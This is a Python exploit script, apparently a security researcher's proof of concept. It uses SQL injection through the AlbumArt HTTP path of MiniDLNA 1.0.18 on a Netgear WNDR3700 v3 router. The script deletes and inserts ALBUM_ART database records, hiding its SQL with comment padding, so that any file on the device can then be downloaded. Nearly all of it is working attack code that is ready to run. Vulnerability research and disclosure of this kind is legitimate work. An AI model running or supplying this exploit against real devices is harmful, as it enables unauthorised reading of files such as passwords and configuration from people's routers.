#!/usr/bin/env python
#albumartinject.py
# Author: Zachary Cutlip
#         zcutlip@tacnetsol.com
#         twitter: @zcutlip
# This script injects a record into the ALBUM_ART table of MiniDLNA's
# SQLite database, that enables extraction of arbitrary files from the
# target's file system via a subsequent HTTP request.
# This affects version 1.0.18 as shipped with Netgear WNDR3700 version 3.

import os
import sys
import urllib,socket,os,httplib
import time

headers={"Host":"10.10.10.1"}
host="10.10.10.1"
album_art_path='/AlbumArt'
inject_id="31337"
port=8200

path_beginning=album_art_path+'/1;'
path_ending='-18.jpg'

class Logging:
    WARN=0
    INFO=1
    DEBUG=2
    log_level=2
    prefixes=[]
    prefixes.append(" [!] ")
    prefixes.append(" [+] ")
    prefixes.append(" [@] ")
    @classmethod
    def log_msg(klass,msg,level=INFO):
        if klass.log_level>=level:
            pref=Logging.prefixes[level]
            print pref+msg

def log(msg):
    Logging.log_msg(msg)

def log_debug(msg):
    Logging.log_msg(msg,Logging.DEBUG)

def log_warn(msg):
    Logging.log_msg(msg,Logging.WARN)

                                                            
def usage():
    usage="Usage: %s [FILE]\nInject a database record allowing HTTP access to FILE.\n" % os.path.basename(sys.argv[0])
    print usage

def build_request(query):
    request=path_beginning+query+path_ending
    return request

def do_request(request):

    log_debug("Requesting:")
    log_debug(request)
    conn=httplib.HTTPConnection(host,port)
    conn.request("GET",request,"",headers)
    resp=conn.getresponse()
    data=resp.read()
    conn.close()
    return data


try:
    desired_file=sys.argv[1]
except IndexError:
    usage()
    exit(1)

log("Requested file is: "+desired_file)

albumart_insert_query='insert/**/into/**/ALBUM_ART(ID,PATH)'+\
                    '/**/VALUES("'+inject_id+'","'+desired_file+'");'

albumart_delete_query='delete/**/from/**/ALBUM_ART/**/where/**/ID="'+inject_id+'";'


log("Deleting old record.")
request=build_request(albumart_delete_query)
resp=do_request(request)
log_debug(resp)

log("Injecting ALBUM_ART record.")
request=build_request(albumart_insert_query)
resp=do_request(request)
log_debug(resp)

log("Injection complete.")
log("You may access "+desired_file)
log("via the URL http://%s:%d%s/%s-18.jpg"%(host,port,album_art_path,inject_id))


